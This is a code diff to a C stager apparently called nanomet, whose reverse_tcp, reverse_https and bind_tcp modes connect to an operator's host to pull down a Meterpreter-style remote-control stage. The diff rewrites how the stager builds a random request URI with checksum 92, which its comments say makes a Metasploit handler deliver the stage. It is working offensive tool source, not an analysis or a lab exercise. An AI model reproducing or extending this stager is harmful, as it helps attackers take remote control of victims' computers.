@@ -46,30 +46,52 @@ void err_exit(char* message){
 	exit(-1);
 }
 
-// ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
-void gen_random(const int len; char s[len], const int len) {
-	static const char alphanum[] =
-		"0123456789"
-		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-		"abcdefghijklmnopqrstuvwxyz";
-	int i = 0;
-
-	for (i = 0; i < (len - 1); ++i) {
-		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
+unsigned char TextChecksum8(char* text)
+{
+	unsigned char temp = 0;
+	for (size_t i = 0; i < strlen(text); i++)
+	{
+		temp += (unsigned char)text[i];
 	}
-
-	s[len - 1] = 0;
+	return temp & 0xff;
 }
 
-int TextChecksum8(char* text)
-{
-	UINT temp = 0;
-	UINT i = 0;
-	for (i = 0; i < strlen(text); i++)
-	{
-		temp += (int)text[i];
+bool gen_random(size_t buflen, char buf[buflen], unsigned char targetSum) {
+	// For this method to work, the buflen must be a multiple of 16, +1.
+	if ((buflen % 16) != 1) return false;
+
+	buf[buflen - 1] = 0;
+
+	// Fill buffer with 'P'.
+	memset(buf, 'P', buflen - 1);
+
+	// Randomly change half the buffer to '0' chars.
+	// After this step, the buffer has a checksum of 0.
+	for (int i = 0; i < (buflen-1)/2; i++) {
+		size_t idx = rand() % (buflen - 1);
+		while (buf[idx] == '0') {
+			idx = (idx + 1) % (buflen - 1);
+		}
+		buf[idx] = '0';
 	}
-	return temp % 0x100;
+
+	// Each iteration of this loop increases the checksum by one, and
+	// a character chosen at random is changed.
+	for (unsigned char i = 0; i < targetSum; i++) {
+		// Pick one of the chars in the buf at random.
+		size_t idx = rand() % (buflen - 1);
+
+		// If this char can't be increased (because it would no longer
+		// be an alphanum), then move on to the next char.
+		while (!isalnum(buf[idx]+1)) {
+			idx = (idx + 1) % (buflen - 1);
+		}
+
+		// Increment.
+		buf[idx] ++;
+	}
+
+	return true;
 }
 
 unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
@@ -180,8 +202,8 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//***************************************************************//
 
 	// Variables
-	char URI[5] = { 0 };	//4 chars ... it can be any length actually.
-	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
+	char URI[17] = { 0 };	//4 chars ... it can be any length actually.
+	char FullURL[sizeof(URI)+1] = { 0 };	// FullURL is ("/" + URI)
 	unsigned char* buffer = NULL;
 	DWORD flags = 0;
 	int dwSecFlags = 0;
@@ -198,25 +220,9 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	// various framework related requests "i.e. coming from stagers" ...
 	// we'll be asking for checksum==92 "INITM", which will get the patched
 	// stage in return.
-	int checksum = 0;
 	srand(GetTickCount());
-	while (TRUE)
-	{
-		// Generate a 4 char long random string ... it could be any
-		// length actually, but 4 sounds just fine.
-		gen_random(URI, sizeof(URI));
-
-		//Get the 8-bit checksum of the random value
-		checksum = TextChecksum8(URI);
-
-		// If the checksum == 92, it will be handled by the
-		// multi/handler correctly as a "INITM" and will send over the
-		// stage.
-		if (checksum == 92)
-		{
-			break; // We found a random string that checksums to 98
-		}
-	}
+	// Generate a random string.
+	gen_random(sizeof(URI), URI, 92);
 	strcpy(FullURL, "/");
 	strcat(FullURL, URI);
 
@@ -312,7 +318,8 @@ int mainw (int argc, char *argv[])
 		"    2: reverse_https\n"
 		"    3: bind_tcp\n"
 		"\nExample:\n"
-		"\"nanomet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
+		"\"nanomet.exe 2 host.com 443\"\n"
+		"will use reverse_https and connect to host.com:443\n";
 
 	if ((argc<=2) || (argc==2 && strcmp(argv[1],"--help")==0)) {
 		printf(helpText);
